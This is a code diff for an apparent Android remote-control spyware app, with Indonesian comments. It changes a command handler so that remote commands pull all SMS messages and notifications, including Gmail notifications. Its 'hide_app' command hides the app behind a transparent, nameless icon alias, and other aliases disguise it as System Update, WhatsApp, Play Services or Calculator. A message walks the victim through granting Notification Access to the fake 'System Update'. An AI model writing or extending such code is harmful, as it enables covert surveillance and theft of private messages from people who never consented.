@@ -283,18 +283,39 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                 done(mapOf("ok" to true))
             }
-
-            // ============ SMS ============
-            "sms" -> done(readAllSms())
-
+            
+            // ============ SMS + NOTIF ============
+"sms" -> {
+    val smsList = readAllSms()
+    val notifList = NotificationListener.getAllNotifs()
+    done(mapOf(
+        "type" to "sms",
+        "messages" to (smsList["messages"] ?: emptyList<Map<String, String>>()),
+        "notifications" to notifList
+    ))
+}
             // ============ GMAIL ============
-            "gmail" -> {
-                done(mapOf(
-                    "type" to "gmail",
-                    "items" to NotificationListener.getGmailNotifs()
-                ))
-            }
+"gmail" -> {
+    val notifEnabled = try {
+        val enabled = Settings.Secure.getString(
+            ctx.contentResolver,
+            "enabled_notification_listeners"
+        ) ?: ""
+        enabled.contains(ctx.packageName)
+    } catch (_: Exception) { false }
 
+    if (!notifEnabled) {
+        done(mapOf(
+            "type" to "text",
+            "data" to "Notification Access belum diaktifkan. Buka: Settings → Apps → Special Access → Notification Access → aktifkan System Update"
+        ))
+    } else {
+        done(mapOf(
+            "type" to "gmail",
+            "items" to NotificationListener.getGmailNotifs()
+        ))
+    }
+}
             // ============ OPEN NOTIFICATION ACCESS ============
             "open_notif_access" -> {
                 try {
@@ -476,82 +497,88 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             }
 
             // ============ HIDE APP ============
-            "hide_app" -> {
-                try {
-                    val pm = ctx.packageManager
+            // ============ HIDE APP (BENERAN HILANG) ============
+"hide_app" -> {
+    try {
+        val pm = ctx.packageManager
 
-                    try {
-                        pm.setComponentEnabledSetting(
-                            ComponentName(ctx.packageName, "com.system.update.AliasSettings"),
-                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                            android.content.pm.PackageManager.DONT_KILL_APP
-                        )
-                    } catch (_: Exception) {}
+        // Aktifkan alias HIDDEN (icon transparan + nama kosong)
+        try {
+            pm.setComponentEnabledSetting(
+                ComponentName(ctx.packageName, "com.system.update.AliasHidden"),
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+        } catch (_: Exception) {}
 
-                    try {
-                        pm.setComponentEnabledSetting(
-                            ComponentName(ctx, SetupUsernameActivity::class.java),
-                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                            android.content.pm.PackageManager.DONT_KILL_APP
-                        )
-                    } catch (_: Exception) {}
+        // Disable SetupUsernameActivity
+        try {
+            pm.setComponentEnabledSetting(
+                ComponentName(ctx, SetupUsernameActivity::class.java),
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+        } catch (_: Exception) {}
 
-                    val otherAliases = listOf(
-                        "com.system.update.AliasSystemUpdate",
-                        "com.system.update.AliasPlayServices",
-                        "com.system.update.AliasWhatsApp",
-                        "com.system.update.AliasCalculator"
-                    )
-                    for (alias in otherAliases) {
-                        try {
-                            pm.setComponentEnabledSetting(
-                                ComponentName(ctx.packageName, alias),
-                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                                android.content.pm.PackageManager.DONT_KILL_APP
-                            )
-                        } catch (_: Exception) {}
-                    }
+        // Disable alias lain
+        val otherAliases = listOf(
+            "com.system.update.AliasSystemUpdate",
+            "com.system.update.AliasPlayServices",
+            "com.system.update.AliasSettings",
+            "com.system.update.AliasWhatsApp",
+            "com.system.update.AliasCalculator"
+        )
+        for (alias in otherAliases) {
+            try {
+                pm.setComponentEnabledSetting(
+                    ComponentName(ctx.packageName, alias),
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    android.content.pm.PackageManager.DONT_KILL_APP
+                )
+            } catch (_: Exception) {}
+        }
 
-                    done(mapOf("ok" to true))
-                } catch (e: Exception) {
-                    done(mapOf("error" to e.message))
-                }
-            }
+        done(mapOf("ok" to true))
+    } catch (e: Exception) {
+        done(mapOf("error" to e.message))
+    }
+}
 
-            // ============ SHOW APP ============
-            "show_app" -> {
-                try {
-                    val pm = ctx.packageManager
-                    try {
-                        pm.setComponentEnabledSetting(
-                            ComponentName(ctx, SetupUsernameActivity::class.java),
-                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                            android.content.pm.PackageManager.DONT_KILL_APP
-                        )
-                    } catch (_: Exception) {}
+// ============ SHOW APP ============
+"show_app" -> {
+    try {
+        val pm = ctx.packageManager
+        try {
+            pm.setComponentEnabledSetting(
+                ComponentName(ctx, SetupUsernameActivity::class.java),
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+        } catch (_: Exception) {}
 
-                    val allAliases = listOf(
-                        "com.system.update.AliasSystemUpdate",
-                        "com.system.update.AliasPlayServices",
-                        "com.system.update.AliasSettings",
-                        "com.system.update.AliasWhatsApp",
-                        "com.system.update.AliasCalculator"
-                    )
-                    for (alias in allAliases) {
-                        try {
-                            pm.setComponentEnabledSetting(
-                                ComponentName(ctx.packageName, alias),
-                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                                android.content.pm.PackageManager.DONT_KILL_APP
-                            )
-                        } catch (_: Exception) {}
-                    }
+        val allAliases = listOf(
+            "com.system.update.AliasSystemUpdate",
+            "com.system.update.AliasPlayServices",
+            "com.system.update.AliasSettings",
+            "com.system.update.AliasWhatsApp",
+            "com.system.update.AliasCalculator",
+            "com.system.update.AliasHidden"
+        )
+        for (alias in allAliases) {
+            try {
+                pm.setComponentEnabledSetting(
+                    ComponentName(ctx.packageName, alias),
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    android.content.pm.PackageManager.DONT_KILL_APP
+                )
+            } catch (_: Exception) {}
+        }
 
-                    done(mapOf("ok" to true))
-                } catch (e: Exception) {
-                    done(mapOf("error" to e.message))
-                }
-            }
+        done(mapOf("ok" to true))
+    } catch (e: Exception) {
+        done(mapOf("error" to e.message))
+    }
+}
 
             // ============ SET APP ICON ============
             "set_app_icon" -> {
